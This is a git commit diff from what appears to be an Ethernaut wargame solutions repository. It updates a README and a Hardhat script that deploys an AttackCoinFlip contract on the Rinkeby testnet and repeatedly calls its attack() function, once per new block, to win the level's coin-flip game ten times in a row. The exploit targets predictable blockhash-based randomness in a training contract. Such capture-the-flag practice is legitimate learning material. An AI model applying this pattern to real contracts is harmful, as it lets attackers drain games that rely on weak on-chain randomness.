4b66b94ec88a2567bc0a2625418eb0fa617ce722
frenchkebab <tubowangin@gmail.com>
2022-09-20 00:09:45 +0900

    [04-CoinFlip #1] Updates Code

--- README.md
+++ README.md
@@ -22,9 +22,17 @@ PRIVATE_KEY=0xabc123abc123abc123abc123abc123abc123abc123abc123abc123abc123abc1
 
 ## Ethernaut 04 - CoinFlip
 
+### Using Remix IDE
+
+You can manualy deploy `contracts/03-CoinFlip/AttackCoinFlip.sol` in Remix IDE and call `attack()` manually 10 times.
+
+### Using Hardhat Script
+
 `hardhat run scripts/03-CoinFlip/coinFlip.js --network rinkeby`
 
 The script deploys `AttackCoinFlip.sol` first.
 
 And it calls `AttackCoinFlip.attack()` function when a new block has been mined.
 (The Script checks if a new block has been mined every two seconds)
+
+⚠️ This has a bug showing same `wins` figure due to the delay of the `consecutiveWins` state variable update
--- scripts/03-CoinFlip/coinFlip.js
+++ scripts/03-CoinFlip/coinFlip.js
@@ -2,7 +2,7 @@ const { Alchemy } = require("alchemy-sdk");
 const hre = require("hardhat");
 
 async function main() {
-  const COINFLIP_ADDRESS = "0x66BD1DAFc0a8ea1E909128a374b98EAbE1B7066e";
+  const COINFLIP_ADDRESS = "0xB02e98da0a724c88ba98157e5934e2a2c8cCa364"; // write your instance address
   const alchemy = new Alchemy();
   let latestBlockNumber;
 
@@ -14,26 +14,33 @@ async function main() {
   await contract.deployed();
 
   const coinFlip = await (
-    await ethers.getContractFactory("CoinFlip")
+    await hre.ethers.getContractFactory("CoinFlip")
   ).attach(COINFLIP_ADDRESS);
 
   const timer = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
   let wins = (await coinFlip.consecutiveWins()).toString();
-  console.log("wins: ", wins);
+  console.log("Initial wins: ", wins);
 
   (async () => {
     while (wins < 10) {
-      const blockNumber = alchemy.core.getBlockNumber();
+      const blockNumber = await alchemy.core.getBlockNumber();
       if (!latestBlockNumber) {
         latestBlockNumber = blockNumber;
       }
 
       if (blockNumber !== latestBlockNumber) {
-        console.log("blockNuber: ", await blockNumber);
-        await contract.attack();
+        latestBlockNumber = blockNumber;
+        console.log("====================================");
+        console.log("blockNuber: ", blockNumber);
+        try {
+          await contract.attack();
+          console.log("successfully attacked!");
+        } catch (err) {
+          console.log("err: ", err);
+        }
+        await timer(2000); // wait for consecutiveWins variable to be updated
         wins = (await coinFlip.consecutiveWins()).toString();
-        console.log("successfully attacked");
         console.log("wins: ", await wins);
       }
       await timer(2000);
